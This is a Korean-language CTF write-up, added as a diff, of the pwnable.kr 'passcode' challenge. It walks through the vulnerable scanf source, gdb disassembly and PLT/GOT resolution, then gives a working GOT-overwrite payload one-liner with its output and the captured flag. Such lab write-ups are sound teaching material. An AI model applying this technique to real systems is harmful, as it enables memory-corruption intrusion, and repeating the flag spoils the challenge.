@@ -1,0 +1,414 @@
+Mommy told me to make a passcode based login system.
+My initial C code was compiled without any error!
+Well, there was some compiler warning, but who cares about that?
+
+ssh passcode@pwnable.kr -p2222 (pw:guest)
+
+==========================================================================
+
+oot@PDM0205-E1:/home/pental/sh# ssh passcode@pwnable.kr -p 2222
+passcode@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87.kr@gmail.com
+- IRC : irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+Last login: Thu Oct 19 05:09:14 2017 from 39.113.83.18
+passcode@ubuntu:~$ cat passcode.c 
+#include <stdio.h>
+#include <stdlib.h>
+
+void login(){
+        int passcode1;
+        int passcode2;
+
+        printf("enter passcode1 : ");
+        scanf("%d", passcode1);
+        fflush(stdin);
+
+        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+        printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+        printf("checking...\n");
+        if(passcode1==338150 && passcode2==13371337){
+                printf("Login OK!\n");
+                system("/bin/cat flag");
+        }
+        else{
+                printf("Login Failed!\n");
+                exit(0);
+        }
+}
+
+void welcome(){
+        char name[100];
+        printf("enter you name : ");
+        scanf("%100s", name);
+        printf("Welcome %s!\n", name);
+}
+
+int main(){
+        printf("Toddler's Secure Login System 1.0 beta.\n");
+
+        welcome();
+        login();
+
+        // something after login...
+        printf("Now I can safely trust you that you have credential :)\n");
+        return 0;
+}
+
+c언어 소스를 보면 welcome() -> login() 순으로 진행
+1. welcome 에서는 100바이트 가량의 문자열을 입력 받음
+2. login 에서 passcode1 은 338150 그리고 passcode2 에는 13371337 이 들어가야 flag를 획득 가능.
+
+평소와는 다른 scanf 구문
+ex ) scanf("%d",&a); //a에 정수를 입력 받음
+하지만 passcode 에서는 scanf("%d",passcode1); 이런 식으로
+변수에 값을 저장시키는 코드가 아니라 주소에 변수의 값을 저장시키는 코드
+
+gdb 해야됨
+==================================================================
+< disassemble welcome() >
+(gdb) disas welcome
+Dump of assembler code for function welcome:
+   0x08048609 <+0>:     push   ebp
+   0x0804860a <+1>:     mov    ebp,esp
+   0x0804860c <+3>:     sub    esp,0x88
+   0x08048612 <+9>:     mov    eax,gs:0x14
+   0x08048618 <+15>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804861b <+18>:    xor    eax,eax
+   0x0804861d <+20>:    mov    eax,0x80487cb
+   0x08048622 <+25>:    mov    DWORD PTR [esp],eax
+   0x08048625 <+28>:    call   0x8048420 <printf@plt>
+   0x0804862a <+33>:    mov    eax,0x80487dd
+   0x0804862f <+38>:    lea    edx,[ebp-0x70]
+   0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048636 <+45>:    mov    DWORD PTR [esp],eax
+   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x0804863e <+53>:    mov    eax,0x80487e3
+   0x08048643 <+58>:    lea    edx,[ebp-0x70]
+   0x08048646 <+61>:    mov    DWORD PTR [esp+0x4],edx
+   0x0804864a <+65>:    mov    DWORD PTR [esp],eax
+   0x0804864d <+68>:    call   0x8048420 <printf@plt>
+   0x08048652 <+73>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x08048655 <+76>:    xor    eax,DWORD PTR gs:0x14
+   0x0804865c <+83>:    je     0x8048663 <welcome+90>
+   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
+   0x08048663 <+90>:    leave  
+   0x08048664 <+91>:    ret    
+End of assembler dump.
+
+================================================================
+
+0x0804860c <+3>:     sub    esp,0x88
+esp를 0x88 만큼 빼서 변수사용에 할당
+
+0x0804862a <+33>:    mov    eax,0x80487dd
+eax에 0x80487dd 할당
+
+0x0804862f <+38>:    lea    edx,[ebp-0x70]
+ebp-70 이라는 스택에서의 주소를 edx에 담음
+
+0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
+이어서 이값을 esp+4에 저장
+
+0x08048636 <+45>:    mov    DWORD PTR [esp],eax
+eax에 담긴 값 0x80487dd을 esp위치에 저장
+
+0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
+scanf() 호출
+
+//eax와 edx 값이 scanf()의 인자로 스택에 들어감
+
+0x08048643 <+58>:    lea    edx,[ebp-0x70]
+0x08048646 <+61>:    mov    DWORD PTR [esp+0x4],edx
+0x0804864a <+65>:    mov    DWORD PTR [esp],eax
+0x0804864d <+68>:    call   0x8048420 <printf@plt>
+0x08048652 <+73>:    mov    eax,DWORD PTR [ebp-0xc]
+
+0x80487dd에는 %100s의 문자열이 ebp-\x70에서는 scanf()를 통해
+입력받을 데이터를 저장 할 주소가 전달된다.
+0x08048643 <+58> 구문에서 ebp-\x70이 name[100] 배열의 시작주소임을 알수 있다.
+ebp-70 ~ ebp-c 까지가 name[100] 배열의 영역
+
+==============================================================================
+< disassemble login() >
+(gdb) disas login
+Dump of assembler code for function login:
+   0x08048564 <+0>:     push   ebp
+   0x08048565 <+1>:     mov    ebp,esp
+   0x08048567 <+3>:     sub    esp,0x28
+   0x0804856a <+6>:     mov    eax,0x8048770
+   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
+   0x08048572 <+14>:    call   0x8048420 <printf@plt>
+   0x08048577 <+19>:    mov    eax,0x8048783
+   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
+   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
+   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x0804858b <+39>:    mov    eax,ds:0x804a02c
+   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
+   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
+   0x08048598 <+52>:    mov    eax,0x8048786
+   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
+   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
+   0x080485a5 <+65>:    mov    eax,0x8048783
+   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
+   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
+   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
+   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
+   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
+   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
+   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
+   0x080485cc <+104>:   jne    0x80485f1 <login+141>
+   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
+   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
+   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
+   0x080485de <+122>:   call   0x8048450 <puts@plt>
+   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
+   0x080485ea <+134>:   call   0x8048460 <system@plt>
+   0x080485ef <+139>:   leave  
+   0x080485f0 <+140>:   ret    
+   0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd
+   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
+   0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
+   0x08048604 <+160>:   call   0x8048480 <exit@plt>
+End of assembler dump.
+
+====================================================================
+
+0x08048577 <+19>:    mov    eax,0x8048783
+0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
+passcode1 이라는 변수가 ebp-0x10의 영역에 위치
+DWORD는 4byte
+
+login() 함수의 passcode1 변수에는 welcome()의 name배열중 끝의 4바이트
+(ebp-0x10 ~ ebp-0xc) 부분에 값이 저장되어 있을 것이다.
+
+간단하게 ebp-0x70 , ebp-0x10 => 0x60 = 96 // 112 - 16 = 96
+
+scanf() 를 통해 welcome()의 name배열 중 끝의 4바이트 (ebp-0x10 ~ ebp-0xc)에
+먼저 입력해 놓은 값이 저장된 login() 함수의 passcode1 변수의
+값에 해당하는 위치에 임의의 값을 입력 할 수 있다는것을 알 수 있다.
+
+//정리
+name[97] ~ name[100] 부분에 scanf를 통해 임의의 주소를 입력할 수 있음.
+특정주소(4바이트)에 특정값(4바이트)를 임의로 작성 가능
+
+============================================================================
+< login() C code >
+void login(){
+        int passcode1;
+        int passcode2;
+
+        printf("enter passcode1 : ");
+        scanf("%d", passcode1);
+        fflush(stdin);
+
+        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+        printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+        printf("checking...\n");
+        if(passcode1==338150 && passcode2==13371337){
+                printf("Login OK!\n");
+                system("/bin/cat flag");
+        }
+        else{
+                printf("Login Failed!\n");
+                exit(0);
+        }
+}
+======================================================================
+
+system() 함수의 전달인자로 주어진 "/bin/cat flag" 를 실행하기 위해서는
+passcode1=338150 그리고 passcode2=13371337이 만족되어야 함
+
+하지만 현재는 passcode1에는 원하는 값을 입력 가능
+그리고 passcode2에는 원하는 값을 입력할 방법이 없음.
+
+4바이트 값을 덮어 씌우는 방법으로 exploit 을 해야된다는 사실을 참고하면
+system("/bin/cat flag"); 이 값의 시작주소를 넣으면 어떻게 될까.
+
+printf("enter passcode1 : ");
+scanf("%d", passcode1); 
+-- 여기까지는 정상적으로 프로그램이 실행되어야만
+exploit 가능, 즉 이 부분 이후의 코드가 exploit을 할 수 있음.
+
+그 다음 코드는 fflush(stdin); 이다.
+이 부분은 코딩 할 때 입력버퍼에 값을 남겨두어 다음
+scanf()에서 이 버퍼에 있는 값을 빼서 사용하는 방법
+exploit 하지 못하도록 입력 버퍼를 지워버리는 방식으로 막아놓은 부분
+
+만약 fflush(stdin); 코드가 시작되는 부분인 fflush() 호ㅍ출 부분에 해당되는
+주소에 system("/bin/cat flag"); 부분의 시작 주소로 덮어 씌울수 있으면 exploit이 가능하다.
+
+fflush()는 라이브러리 함수인데 이라이브러리 함수들의 시작주소는 어떻게 알수 있을까?
+// PLT&GOT 개념 필요
+
+1. PLT&GOT(1) : PLT와 GOT의 관계에 대해 설명
+
+http://noisivohees.tistory.com/22
+
+2. PLT&GOT(2) : GOT에서 라이브러리 함수의 라이브러리 영역 내의 실제 주소를
+구하는 방식에 대해 설명
+
+http://noisivohees.tistory.com/26
+
+(x/i : 기계어 명령 출력)
+=======================================================================================
+< 안보고 싶으면 349 라인으로 이동 >
+gdb) x/10i 0x08048450                                                     
+   0x8048450 <puts@plt>:        jmp    DWORD PTR ds:0x804a00c
+   0x8048456 <puts@plt+6>:      push   0x18
+   0x804845b <puts@plt+11>:     jmp    0x8048410
+   0x8048460 <system@plt>:      jmp    DWORD PTR ds:0x804a010
+   0x8048466 <system@plt+6>:    push   0x20
+   
+0x8048450 ~ 0x804845b 부분에 걸쳐서 puts 실행부분이 정의 되어 있음.
+
+이어서 0x8048450 <puts@plt>:        jmp    DWORD PTR ds:0x804a00c
+부분을 확인하면 ds:0x804a00c 부분으로 점프하는 것을 확인
+
+(gdb) x/x 0x804a00c
+0x804a00c <puts@got.plt>:       0x08048456
+
+got 부분
+
+지금은 함수를 처음 호출하는 상태이니 GOT부분에는 
+실제 함수의 주소는 담겨있지는 않을 것
+따라서 이 부분에서 GOT에서 실제 함수의 주소를 구하는 부분으로
+이어지는 부분
+
+0x8048456 <puts@plt+6>:      push   0x18
+
+puts 의 PLT 에서 puts@plt+6 부분
+
+다시말해 PLT에서 GOT를 참조하려고 했는데 
+함수의 첫 호출이라 실제 함수의 주소가 없으니
+실제 함수의 주소를 구하기 위해 PLT의 다음 부분으로
+넘어가는 부분
+
+(gdb) x/3i 0x8048450                                                       
+   0x8048450 <puts@plt>:        jmp    DWORD PTR ds:0x804a00c
+   0x8048456 <puts@plt+6>:      push   0x18
+   0x804845b <puts@plt+11>:     jmp    0x8048410
+   
+plt+6 부분의 0x18 이라는 값을 push
+plt+11 부분에서 0x8048410 부분으로 jump하는 것을 확인
+
+=======================================================================
+< 함수정리 >
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048665 <+0>:     push   ebp
+   0x08048666 <+1>:     mov    ebp,esp
+   0x08048668 <+3>:     and    esp,0xfffffff0
+   0x0804866b <+6>:     sub    esp,0x10
+   0x0804866e <+9>:     mov    DWORD PTR [esp],0x80487f0
+   0x08048675 <+16>:    call   0x8048450 <puts@plt>
+   0x0804867a <+21>:    call   0x8048609 <welcome>
+   0x0804867f <+26>:    call   0x8048564 <login>
+   0x08048684 <+31>:    mov    DWORD PTR [esp],0x8048818
+   0x0804868b <+38>:    call   0x8048450 <puts@plt>
+   0x08048690 <+43>:    mov    eax,0x0
+   0x08048695 <+48>:    leave  
+   0x08048696 <+49>:    ret    
+End of assembler dump.
+(gdb) x/3i 0x8048450
+   0x8048450 <puts@plt>:        jmp    DWORD PTR ds:0x804a00c
+   0x8048456 <puts@plt+6>:      push   0x18
+   0x804845b <puts@plt+11>:     jmp    0x8048410
+(gdb) x/x 0x804a00c
+0x804a00c <puts@got.plt>:       0x08048456
+(gdb) x/3i 0x8048450
+   0x8048450 <puts@plt>:        jmp    DWORD PTR ds:0x804a00c
+   0x8048456 <puts@plt+6>:      push   0x18
+   0x804845b <puts@plt+11>:     jmp    0x8048410
+(gdb) x/3i 0x8048410
+   0x8048410:   push   DWORD PTR ds:0x8049ff8
+   0x8048416:   jmp    DWORD PTR ds:0x8049ffc
+   0x804841c:   add    BYTE PTR [eax],al
+
+<호출관계>
+1. main+16 : main()의 0x08048675 부분에서 puts의 plt 부분인 0x8048450 부분으로 jump
+
+2. puts@plt : puts의 plt부분인 8048450부분에서 명령이 계속 실행되는데 이 때, 먼저 0x804a00c 부분으로 jump 
+
+3. puts@got.plt : puts의 got부분인 0x804a00c 부분으로 jump해보면 0x08048456 이라는 데이터가 있는데
+이 부분은 puts@plt+6 에 해당하는 데이터 영역
+
+4. puts@plt+6 : plt 부분에서 이어서 명령을 실행하는데 0x18이라는 값을 스택에 push한 후
+
+5. puts@plt+11 : 8048410으로 jump
+
+=====================================================================================================================
+
+< 다시풀이 >
+
+fflush() 의 GOT에 적혀있는 값을 system(~); 부분으로 돌려버리자
+
+페이로드 
+1. 4byte 만큼의 주소에 특정값을 덮어 씌우는 방법
+2. fflush()의 GOT
+3. system(~); 이 시작하는 주소
+
+(gdb) disas login
+Dump of assembler code for function login:
+   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
+
+fflush() 가 호출되면 0x8048430 부분인 fflush의 plt를 참조함
+0x8048430 는 plt 부분이니 fflush의 plt를 보기위해 x/i 명령
+
+(gdb) x/3i 0x8048430
+   0x8048430 <fflush@plt>:      jmp    DWORD PTR ds:0x804a004
+   0x8048436 <fflush@plt+6>:    push   0x8
+   0x804843b <fflush@plt+11>:   jmp    0x8048410
+   
+fflush 의 plt에는 0x804a004 부분으로 점프하는 부분
+plt가 참조하는 곳 = fflush의 got 부분
+
+(gdb) x/x 0x804a004
+0x804a004 <fflush@got.plt>:     0x08048436
+
+//fflush()의 GOT 주소 : 0x0804a004
+
+3. system(~); 시작되는 주소?
+system 함수를 호출하는 코드가 이어지는 부분
+login() 함수에서 발견 가능
+
+0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
+0x080485ea <+134>:   call   0x8048460 <system@plt>
+
+(gdb) x/s 0x80487af
+0x80487af:      "/bin/cat flag"
+
+system(~); 이 시작되는 주소 : 0x080485e3 = 134514147
+
+페이로드
+
+(python -c 'print "\x90" * 96 + "\x04\xa0\x04\x08" + 134514147"') | ./passcode
+
+0x080485e3을 10진수로 변환한 이유?
+scanf()에서 %d 형태로 10진수로 입력 받음.
+
+=======================================================================================
+
+passcode@ubuntu:~$ (python -c 'print "\x90" * 96 + "\x04\xa0\x04\x08" + "134514147"') | ./passcode                                                    
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome ������������������������������������������������������������������������������������������������!
+Sorry mom.. I got confused about scanf usage :(
+enter passcode1 : Now I can safely trust you that you have credential :)
+
+PAYLOAD = (python -c 'print "\x90" * 96 + "\x04\xa0\x04\x08" + "134514147"') | ./passcode
+FLAG = Sorry mom.. I got confused about scanf usage :(
